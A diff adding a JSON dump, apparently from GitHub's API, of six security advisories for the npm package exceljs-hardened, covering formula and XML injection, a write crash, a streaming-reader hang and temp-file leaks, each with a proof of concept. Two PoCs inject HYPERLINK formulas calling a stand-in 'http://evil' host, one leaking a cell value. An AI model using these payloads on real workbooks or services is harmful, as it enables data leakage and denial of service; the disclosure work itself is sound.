@@ -1,0 +1,3484 @@
+{
+  "source": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories?per_page=100",
+  "data": [
+    {
+      "ghsa_id": "GHSA-xc5x-w9vh-g5g5",
+      "cve_id": null,
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-xc5x-w9vh-g5g5",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-xc5x-w9vh-g5g5",
+      "summary": "Invalid or empty creation date makes writing the workbook fail",
+      "description": "### Summary\r\n\r\nA workbook whose `dcterms:created` is unparsable or empty loads normally, but writing it back throws a `RangeError`.\r\n\r\n\r\n### Details\r\n\r\nThe invalid date loads as `Invalid Date`. On write, the core properties formatter calls `toISOString()` on it without checking validity, which throws.\r\n\r\n\r\n### Proof of concept\r\n\r\nIn `docProps/core.xml` of any valid workbook:\r\n\r\n```xml\r\n<dcterms:created xsi:type=\"dcterms:W3CDTF\">garbage</dcterms:created>\r\n```\r\n\r\nAn empty element behaves the same.\r\n\r\n```js\r\nconst wb = new ExcelJS.Workbook();\r\nawait wb.xlsx.load(buffer);          // succeeds, wb.created is Invalid Date\r\n\r\nawait wb.xlsx.writeBuffer();\r\n// RangeError: Invalid time value\r\n```\r\n\r\n\r\n### Impact\r\n\r\nAny upload, clean, re-export pipeline fails on such a file. Empty date elements occur in files produced by other tools.\r\n",
+      "severity": "medium",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-xc5x-w9vh-g5g5",
+          "type": "GHSA"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-10-16T16:07:19Z",
+      "published_at": "2026-10-16T16:07:19Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+          "score": 6.9
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-20",
+          "name": "Improper Input Validation"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-20"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-j5p2-gcf6-8mc3",
+      "cve_id": null,
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-j5p2-gcf6-8mc3",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-j5p2-gcf6-8mc3",
+      "summary": "Formula injection through `containsText` conditional formatting",
+      "description": "### Summary\r\n\r\nThe text of a `containsText` conditional formatting rule is placed in a formula string literal without escaping double quotes. A crafted text leaves the string and injects formula code.\r\n\r\n\r\n### Details\r\n\r\nThe rule generates `NOT(ISERROR(SEARCH(\"<text>\",<cell>)))`. Inside an Excel string literal a `\"` must be written `\"\"`; it was not.\r\n\r\n\r\n### Proof of concept\r\n\r\n```js\r\nconst ws = wb.addWorksheet('S');\r\nws.addRows([['hello'], ['x']]);\r\n\r\nws.addConditionalFormatting({\r\n  ref: 'A1:A2',\r\n  rules: [{\r\n    type: 'containsText',\r\n    operator: 'containsText',\r\n    text: 'a\")),HYPERLINK(\"http://evil\",\"x\")&(\"',\r\n    style: { font: { bold: true } },\r\n    priority: 1,\r\n  }],\r\n});\r\n```\r\n\r\nThe rule formula in the sheet XML becomes:\r\n\r\n```\r\nNOT(ISERROR(SEARCH(\"a\")),HYPERLINK(\"http://evil\",\"x\")&(\"\",A1)))\r\n```\r\n\r\nAn ordinary text such as `say \"hi\"` already produces an invalid formula.\r\n\r\n\r\n### Impact\r\n\r\nWhen the search term comes from a user, the generated workbook contains a formula chosen by that user. The result of a conditional formatting formula is only used as a condition, so the practical reach is limited, and ordinary quoted text breaks the rule.\r\n",
+      "severity": "low",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-j5p2-gcf6-8mc3",
+          "type": "GHSA"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-10-16T16:07:09Z",
+      "published_at": "2026-10-16T16:07:09Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:P/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N",
+          "score": 2.3
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-1236",
+          "name": "Improper Neutralization of Formula Elements in a CSV File"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-1236"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-qjfh-3mh9-356v",
+      "cve_id": "CVE-2026-128348",
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-qjfh-3mh9-356v",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-qjfh-3mh9-356v",
+      "summary": "Formula injection through table column names in the totals row",
+      "description": "### Summary\r\n\r\nThe totals row formula of a table is built from the column name without escaping. A crafted column name injects an arbitrary formula into the generated workbook.\r\n\r\n\r\n### Details\r\n\r\nThe formula is built as `SUBTOTAL(109,<table>[<column>])`. In an Excel structured reference, `[`, `]`, `#` and `'` must be escaped with a leading `'`; they were not, so a `]` in the name closes the reference.\r\n\r\n\r\n### Proof of concept\r\n\r\n```js\r\nconst ws = wb.addWorksheet('S');\r\n\r\nws.addTable({\r\n  name: 'T',\r\n  ref: 'A1',\r\n  headerRow: true,\r\n  totalsRow: true,\r\n  columns: [\r\n    { name: 'k' },\r\n    { name: 'Amount])+HYPERLINK(\"http://evil/?\"&A2,\"x\")+SUM(T[Amount', totalsRowFunction: 'sum' },\r\n  ],\r\n  rows: [['a', 1], ['b', 2]],\r\n});\r\n```\r\n\r\nThe totals cell contains:\r\n\r\n```\r\nSUBTOTAL(109,T[Amount])+HYPERLINK(\"http://evil/?\"&A2,\"x\")+SUM(T[Amount])\r\n```\r\n\r\nA name such as `It's [x] #1` also produces an invalid reference.\r\n\r\n\r\n### Impact\r\n\r\nWhen column names come from untrusted data (imported CSV headers, for example), the generated workbook contains a formula chosen by the attacker. Functions such as `HYPERLINK` can leak cell values once the user enables editing and clicks.\r\n",
+      "severity": "low",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-qjfh-3mh9-356v",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-128348",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-11-14T17:56:39Z",
+      "published_at": "2026-10-16T16:06:48Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:A/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
+          "score": 2.1
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-1236",
+          "name": "Improper Neutralization of Formula Elements in a CSV File"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-1236"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-2qj3-x4q8-c2h3",
+      "cve_id": null,
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-2qj3-x4q8-c2h3",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-2qj3-x4q8-c2h3",
+      "summary": "Streaming reader never settles on a corrupt compressed entry",
+      "description": "### Summary\r\n\r\nA workbook with a corrupt compressed worksheet makes the streaming reader's iteration neither resolve nor reject. The caller waits forever, and descriptors are retained.\r\n\r\n\r\n### Details\r\n\r\nWhile copying a worksheet to a temporary file, the reader listens for errors on the file stream only. A corrupt deflate stream raises its error on the ZIP entry, which nobody listens to, so the promise stays pending.\r\n\r\nLoading the same file with `xlsx.load()` rejects correctly.\r\n\r\n\r\n### Proof of concept\r\n\r\nFlip some bytes in the compressed data of `xl/worksheets/sheet1.xml` of a valid workbook, then:\r\n\r\n```js\r\nconst reader = new ExcelJS.stream.xlsx.WorkbookReader('corrupt.xlsx', {\r\n  worksheets: 'emit', sharedStrings: 'cache',\r\n});\r\n\r\nfor await (const ws of reader) {      // never resolves, never throws\r\n  for await (const row of ws) { /* … */ }\r\n}\r\n```\r\n\r\nEach read retains two file descriptors. Outside a server, the process exits silently with code 0.\r\n\r\n\r\n### Impact\r\n\r\nRequests that read untrusted uploads hang indefinitely, since no `catch` is ever reached, and each one holds resources. A small file is enough.\r\n",
+      "severity": "medium",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-2qj3-x4q8-c2h3",
+          "type": "GHSA"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-10-16T16:06:36Z",
+      "published_at": "2026-10-16T16:06:36Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+          "score": 6.9
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-755",
+          "name": "Improper Handling of Exceptional Conditions"
+        },
+        {
+          "cwe_id": "CWE-772",
+          "name": "Missing Release of Resource after Effective Lifetime"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-755",
+        "CWE-772"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-mp7v-gxhv-42h2",
+      "cve_id": "CVE-2026-128346",
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-mp7v-gxhv-42h2",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-mp7v-gxhv-42h2",
+      "summary": "Temporary files and descriptors leaked by the streaming reader",
+      "description": "### Summary\r\n\r\nWhen a workbook fails to parse in the streaming reader, the temporary files created for its worksheets are not removed. Repeated uploads accumulate files and descriptors until the process restarts.\r\n\r\n\r\n### Details\r\n\r\nWhen worksheets come before `xl/sharedStrings.xml`, the reader copies each one to a temporary file and parses them afterwards. The files are released one by one, only as each sheet is parsed successfully.\r\n\r\nAn error on one sheet, or a consumer that stops iterating early, leaves every remaining file in place.\r\n\r\n\r\n### Proof of concept\r\n\r\nTake a workbook with 50 sheets written by the library and replace `xl/worksheets/sheet1.xml` with:\r\n\r\n```xml\r\n<worksheet><sheetData><row r=\"1\"><c r=\"A1\"><v>1</row></sheetData>\r\n```\r\n\r\n```js\r\nfor (let i = 0; i < 2; i++) {\r\n  const reader = new ExcelJS.stream.xlsx.WorkbookReader('crafted.xlsx', {\r\n    worksheets: 'emit', sharedStrings: 'cache',\r\n  });\r\n  try {\r\n    for await (const ws of reader) for await (const row of ws) { /* … */ }\r\n  } catch (e) { /* parse error */ }\r\n}\r\n\r\nfs.readdirSync(os.tmpdir()).filter(f => f.startsWith('tmp-')).length;   // 100\r\n```\r\n\r\nEach failed read leaves one file per sheet, until the process exits.\r\n\r\n\r\n### Impact\r\n\r\nDenial of service of a long-running process that reads untrusted uploads with the streaming reader: the temporary directory fills, and file descriptors run out (`EMFILE`), after which the process can no longer open files or sockets.\r\n",
+      "severity": "high",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-mp7v-gxhv-42h2",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-128346",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-11-14T17:55:35Z",
+      "published_at": "2026-10-16T16:06:26Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+          "score": 8.7
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-772",
+          "name": "Missing Release of Resource after Effective Lifetime"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-772"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-mj37-5928-xq9x",
+      "cve_id": null,
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-mj37-5928-xq9x",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-mj37-5928-xq9x",
+      "summary": "XML injection and invalid references from sheet names containing a quote",
+      "description": "### Summary\r\n\r\nSheet names are written into range references without escaping the quote character, and the streaming writer puts merged ranges into the XML without encoding. A crafted sheet name injects XML, and an ordinary name such as `Bob's data` produces an invalid reference.\r\n\r\n\r\n### Details\r\n\r\nA range with a sheet name is serialized as `'name'!A1:B2`. Excel requires `'` inside the name to be doubled; the library did not.\r\n\r\nIn the streaming writer, the serialized range is then inserted raw into `<mergeCell ref=\"…\"/>`.\r\n\r\n\r\n### Proof of concept\r\n\r\n```js\r\nconst writer = new ExcelJS.stream.xlsx.WorkbookWriter({ filename: 'out.xlsx' });\r\nconst ws = writer.addWorksheet('S');\r\nconst row = ws.addRow([1]);\r\n\r\nws.mergeCells(1, 1, 2, 2, `x'\"/><injected/><a b=\"'`);\r\n\r\nrow.commit();\r\nawait ws.commit();\r\nawait writer.commit();\r\n```\r\n\r\nThe sheet XML contains:\r\n\r\n```xml\r\n<mergeCell ref=\"'x'\"/><injected/><a b=\"''!A1:B2\"/>\r\n```\r\n\r\nWithout any attack, `new Range(1, 1, 2, 2, \"Bob's data\").range` gives `'Bob's data'!A1:B2`, which is not a valid reference.\r\n\r\n\r\n### Impact\r\n\r\nA user-controlled sheet name reaching `mergeCells` alters the generated XML. Sheet names with an apostrophe produce references Excel cannot read.\r\n",
+      "severity": "low",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-mj37-5928-xq9x",
+          "type": "GHSA"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-10-16T16:06:15Z",
+      "published_at": "2026-10-16T16:06:15Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:P/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N",
+          "score": 2.3
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-91",
+          "name": "XML Injection"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-91"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
